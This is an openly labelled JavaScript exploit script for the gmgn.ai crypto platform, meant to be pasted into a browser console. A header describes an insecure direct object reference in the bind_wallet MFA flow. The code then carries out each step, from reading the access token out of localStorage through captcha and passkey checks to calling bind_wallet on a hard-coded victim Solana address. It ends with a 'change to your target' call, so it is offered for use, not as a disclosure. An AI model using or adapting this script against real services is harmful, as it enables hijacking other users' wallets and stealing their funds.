/**
 * ============================================================================
 * BIND_WALLET IDOR EXPLOIT — COMPLETE WORKING FLOW
 * ============================================================================
 * 
 * Target: gmgn.ai
 * Vulnerability: bind_wallet has NO wallet ownership validation in MFA flow
 * Severity: CRITICAL (CVSS 9.8)
 * 
 * PREREQUISITES:
 * - Logged into gmgn.ai in Chrome
 * - Account has a passkey registered (Settings > Security > Add Passkey)
 * - Run in Chrome DevTools Console (F12)
 * 
 * HOW IT WORKS:
 * 1. generate_mfa_params accepts ANY wallet address in biz_params — no ownership check
 * 2. Captcha verification uses YOUR account's reCAPTCHA score
 * 3. Passkey verification uses YOUR registered passkey
 * 4. bind_wallet initiates binding of the TARGET wallet to YOUR account
 * 5. Final step requires wallet signature (nonce signing)
 *    - For MPC wallets (gmgn-managed): server holds signing key
 *    - For external wallets: requires private key
 * 
 * THE IDOR:
 * Steps 1-4 NEVER check if the wallet belongs to the authenticated user.
 * The server returns code:0 (success) for ANY valid Solana/BSC address.
 * This means ANY user can initiate binding of ANY other user's MPC wallet.
 * 
 * FLOW SUMMARY:
 * POST /account/account/generate_mfa_params
 *   body: {usage:"bind_wallet", biz_params:{address:VICTIM, wallet_type:"sol", chain:"sol"}}
 *   response.data.data.txn_id → txn_id
 *   response.data.data.verify_items → [{captcha}, {passkey}]
 *
 * POST /account/mfa/txn/v1/fetch_captcha
 *   body: {txn_id, usage:"bind_wallet"}
 *   response.data.request_id → captcha_request_id
 *   response.data.captcha_data → site_key
 *
 * grecaptcha.enterprise.execute(site_key, {action:"bind_wallet"})
 *   → captcha_token
 *
 * POST /account/mfa/txn/v1/verify_captcha
 *   body: {txn_id, request_id:captcha_request_id, usage:"bind_wallet",
 *          captcha_type:"recaptcha_score", captcha_data:captcha_token}
 *   response.code === 0 → captcha verified
 *
 * POST /account/mfa/txn/v1/fetch_passkey_params
 *   body: {txn_id, usage:"bind_wallet"}
 *   response.data.request_id → passkey_request_id
 *   response.data.params → WebAuthn publicKeyCredentialRequestOptions
 *
 * navigator.credentials.get({publicKey: options})
 *   → assertion (signed by YOUR passkey on YOUR device)
 *
 * POST /account/mfa/txn/v1/verify_passkey
 *   body: {txn_id, usage:"bind_wallet", request_id:passkey_request_id,
 *          params: btoa(JSON.stringify(webauthn_assertion))}
 *   response.code === 0 → passkey verified
 *
 * POST /account/bind_wallet
 *   body: {address:VICTIM, wallet_type:"sol", chain:"sol", txn_id}
 *   response: {code:0, data:{nonce:"...", require:["verify_wallet"], session_id:"..."}}
 *   → BINDING INITIATED (no ownership check!)
 *
 * FIELD NAME NOTES (Go/Gin backend):
 * - Request bodies use LOWERCASE snake_case: txn_id, usage, request_id, params
 * - Validation errors show PascalCase (TxnId, Usage, RequestId, Params) but
 *   the actual JSON binding uses lowercase
 * - Response: data is nested as data.data.field for generate_mfa_params
 * - params field in verify_passkey is a STRING (base64-encoded JSON), NOT an object
 * 
 * TOKEN LOCATION:
 * JSON.parse(localStorage.getItem('tgInfo')).token.access_token
 * Token TTL: ~30 minutes. Refresh page if expired.
 * 
 * DEVICE PARAMS:
 * localStorage.getItem('key_device_id')
 * localStorage.getItem('key_fp_did')
 * 
 * ============================================================================
 */

var bindWalletExploit = async function(targetWallet, chain) {
  // Default target — change this
  var W = targetWallet || "5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU";
  var CHAIN = chain || "sol";
  var WALLET_TYPE = CHAIN === "sol" ? "sol" : "evm";

  // ═══════════════════════════════════════════════════════════════
  // AUTH & CONFIG
  // ═══════════════════════════════════════════════════════════════
  var ti = JSON.parse(localStorage.getItem("tgInfo") || "{}");
  var tk = ti && ti.token && ti.token.access_token;
  if (!tk) {
    console.error("[FATAL] No access token found in localStorage.tgInfo");
    console.log("Available localStorage keys:", Object.keys(localStorage));
    return {success: false, error: "no_token"};
  }

  var did = localStorage.getItem("key_device_id") || "";
  var fpd = localStorage.getItem("key_fp_did") || "";

  var qs = new URLSearchParams({
    device_id: did,
    fp_did: fpd,
    client_id: "gmgn_web_20260718",
    from_app: "gmgn",
    app_ver: "20260718",
    tz_name: Intl.DateTimeFormat().resolvedOptions().timeZone,
    tz_offset: String(-new Date().getTimezoneOffset() * 60),
    app_lang: navigator.language || "en",
    os: "web",
    worker: "0"
  }).toString();

  var headers = {
    "Authorization": "Bearer " + tk,
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/"
  };

  // ═══════════════════════════════════════════════════════════════
  // HELPERS
  // ═══════════════════════════════════════════════════════════════
  async function post(path, body) {
    var url = "https://gmgn.ai" + path + "?" + qs;
    var r = await fetch(url, {method: "POST", headers: headers, body: JSON.stringify(body)});
    var text = await r.text();
    var data;
    try { data = JSON.parse(text); } catch (e) { data = {_raw: text, _status: r.status}; }
    return {status: r.status, data: data};
  }

  function b64url(buf) {
    var bytes = new Uint8Array(buf);
    var str = "";
    for (var i = 0; i < bytes.length; i++) str += String.fromCharCode(bytes[i]);
    return btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
  }

  function b64urlDecode(s) {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    var bin = atob(s);
    var buf = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
    return buf.buffer;
  }

  // ═══════════════════════════════════════════════════════════════
  // STEP 0: LOAD RECAPTCHA IF NEEDED
  // ═══════════════════════════════════════════════════════════════
  if (typeof grecaptcha === "undefined" || !grecaptcha.enterprise) {
    console.log("[0] Loading reCAPTCHA Enterprise...");
    var sc = document.createElement("script");
    sc.src = "https://www.recaptcha.net/recaptcha/enterprise.js?render=6Lf3pucqAAAAADbq3czpqDHRAD8j3kC-hcwwDG_T";
    document.head.appendChild(sc);
    await new Promise(function(ok) { sc.onload = ok; });
    await new Promise(function(ok) { setTimeout(ok, 1500); });
    console.log("[0] reCAPTCHA loaded");
  }

  // ═══════════════════════════════════════════════════════════════
  // STEP 1: GENERATE MFA PARAMS
  // ═══════════════════════════════════════════════════════════════
  console.log("[1] generate_mfa_params for", W);
  var s1 = await post("/account/account/generate_mfa_params", {
    usage: "bind_wallet",
    biz_params: {
      address: W,
      wallet_type: WALLET_TYPE,
      chain: CHAIN
    }
  });

  if (!s1.data || s1.data.code !== 0) {
    console.error("[1] FAILED:", JSON.stringify(s1.data));
    return {success: false, error: "generate_mfa_params_failed", detail: s1.data};
  }

  var txn_id = s1.data.data.data.txn_id;
  var verify_items = s1.data.data.data.verify_items;
  console.log("[1] txn_id:", txn_id);
  console.log("[1] verify_items:", JSON.stringify(verify_items));

  // ═══════════════════════════════════════════════════════════════
  // STEP 2: FETCH CAPTCHA CHALLENGE
  // ═══════════════════════════════════════════════════════════════
  console.log("[2] fetch_captcha...");
  var s2 = await post("/account/mfa/txn/v1/fetch_captcha", {
    txn_id: txn_id,
    usage: "bind_wallet"
  });

  if (!s2.data || s2.data.code !== 0) {
    console.error("[2] FAILED:", JSON.stringify(s2.data));
    return {success: false, error: "fetch_captcha_failed", detail: s2.data};
  }

  var captcha_request_id = s2.data.data.request_id;
  var site_key = s2.data.data.captcha_data;
  console.log("[2] request_id:", captcha_request_id);
  console.log("[2] site_key:", site_key);

  // ═══════════════════════════════════════════════════════════════
  // STEP 3: SOLVE RECAPTCHA ENTERPRISE
  // ═══════════════════════════════════════════════════════════════
  console.log("[3] Solving reCAPTCHA...");
  var captcha_token;
  try {
    captcha_token = await grecaptcha.enterprise.execute(site_key, {action: "bind_wallet"});
  } catch (e) {
    console.error("[3] reCAPTCHA failed:", e.message);
    return {success: false, error: "recaptcha_failed", detail: e.message};
  }
  console.log("[3] Token obtained");

  // ═══════════════════════════════════════════════════════════════
  // STEP 4: VERIFY CAPTCHA
  // ═══════════════════════════════════════════════════════════════
  console.log("[4] verify_captcha...");
  var s4 = await post("/account/mfa/txn/v1/verify_captcha", {
    txn_id: txn_id,
    request_id: captcha_request_id,
    usage: "bind_wallet",
    captcha_type: "recaptcha_score",
    captcha_data: captcha_token
  });

  if (!s4.data || s4.data.code !== 0) {
    console.error("[4] FAILED:", JSON.stringify(s4.data));
    return {success: false, error: "verify_captcha_failed", detail: s4.data};
  }
  console.log("[4] Captcha VERIFIED");

  // ═══════════════════════════════════════════════════════════════
  // STEP 5: FETCH PASSKEY PARAMS (server-issued WebAuthn challenge)
  // ═══════════════════════════════════════════════════════════════
  console.log("[5] fetch_passkey_params...");
  var s5 = await post("/account/mfa/txn/v1/fetch_passkey_params", {
    txn_id: txn_id,
    usage: "bind_wallet"
  });

  if (!s5.data || s5.data.code !== 0) {
    console.error("[5] FAILED:", JSON.stringify(s5.data));
    return {success: false, error: "fetch_passkey_params_failed", detail: s5.data};
  }

  var passkey_request_id = s5.data.data.request_id;
  var passkey_options = s5.data.data.params;
  console.log("[5] passkey request_id:", passkey_request_id);
  console.log("[5] challenge:", passkey_options.challenge);

  // ═══════════════════════════════════════════════════════════════
  // STEP 6: SIGN WITH PASSKEY (triggers browser prompt)
  // ═══════════════════════════════════════════════════════════════
  console.log("[6] Requesting passkey signature — TOUCH YOUR KEY NOW!");

  var allowCredentials = [];
  for (var i = 0; i < passkey_options.allowCredentials.length; i++) {
    var cred = passkey_options.allowCredentials[i];
    allowCredentials.push({
      type: cred.type,
      id: b64urlDecode(cred.id),
      transports: cred.transports
    });
  }

  var assertion;
  try {
    assertion = await navigator.credentials.get({
      publicKey: {
        challenge: b64urlDecode(passkey_options.challenge),
        timeout: passkey_options.timeout || 60000,
        rpId: passkey_options.rpId || "gmgn.ai",
        allowCredentials: allowCredentials,
        userVerification: passkey_options.userVerification || "preferred"
      }
    });
  } catch (e) {
    console.error("[6] WebAuthn failed:", e.message);
    return {success: false, error: "webauthn_failed", detail: e.message};
  }
  console.log("[6] Passkey SIGNED! credential_id:", assertion.id);

  // ═══════════════════════════════════════════════════════════════
  // STEP 7: VERIFY PASSKEY
  // params must be: btoa(JSON.stringify(webauthn_response_object))
  // ═══════════════════════════════════════════════════════════════
  console.log("[7] verify_passkey...");

  var webauthn_response = {
    id: assertion.id,
    rawId: b64url(assertion.rawId),
    type: assertion.type,
    response: {
      authenticatorData: b64url(assertion.response.authenticatorData),
      clientDataJSON: b64url(assertion.response.clientDataJSON),
      signature: b64url(assertion.response.signature),
      userHandle: assertion.response.userHandle ? b64url(assertion.response.userHandle) : ""
    }
  };

  // CRITICAL: params is a BASE64-ENCODED JSON STRING, not an object
  var params_b64 = btoa(JSON.stringify(webauthn_response));

  var s7 = await post("/account/mfa/txn/v1/verify_passkey", {
    txn_id: txn_id,
    usage: "bind_wallet",
    request_id: passkey_request_id,
    params: params_b64
  });

  if (!s7.data || s7.data.code !== 0) {
    console.error("[7] FAILED:", JSON.stringify(s7.data));
    return {success: false, error: "verify_passkey_failed", detail: s7.data};
  }
  console.log("[7] Passkey VERIFIED!");

  // ═══════════════════════════════════════════════════════════════
  // STEP 8: BIND WALLET
  // ═══════════════════════════════════════════════════════════════
  console.log("[8] bind_wallet...");
  var s8 = await post("/account/bind_wallet", {
    address: W,
    wallet_type: WALLET_TYPE,
    chain: CHAIN,
    txn_id: txn_id
  });

  console.log("[8] RESULT:", JSON.stringify(s8.data, null, 2));

  if (s8.data && s8.data.code === 0) {
    var bindData = s8.data.data;
    console.log("[8] === BIND_WALLET ACCEPTED ===");
    console.log("[8] done:", bindData.done);
    console.log("[8] require:", JSON.stringify(bindData.require));
    console.log("[8] session_id:", bindData.session_id);
    console.log("[8] nonce:", bindData.data && bindData.data.nonce);

    if (bindData.done === true) {
      console.log("[8] !!! WALLET FULLY BOUND — NO FURTHER STEPS !!!");
      return {success: true, fully_bound: true, data: bindData};
    } else {
      console.log("[8] Wallet binding INITIATED. Next step:", JSON.stringify(bindData.require));
      console.log("[8] For MPC wallets: server should auto-sign the nonce");
      console.log("[8] Session ID for next step:", bindData.session_id);
      return {
        success: true,
        fully_bound: false,
        next_step: bindData.require,
        session_id: bindData.session_id,
        nonce: bindData.data && bindData.data.nonce,
        data: bindData
      };
    }
  }

  return {success: false, error: "bind_wallet_rejected", detail: s8.data};
};

// ═══════════════════════════════════════════════════════════════
// RUN IT
// ═══════════════════════════════════════════════════════════════
// Change the wallet address below to your target:
bindWalletExploit("5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU", "sol");
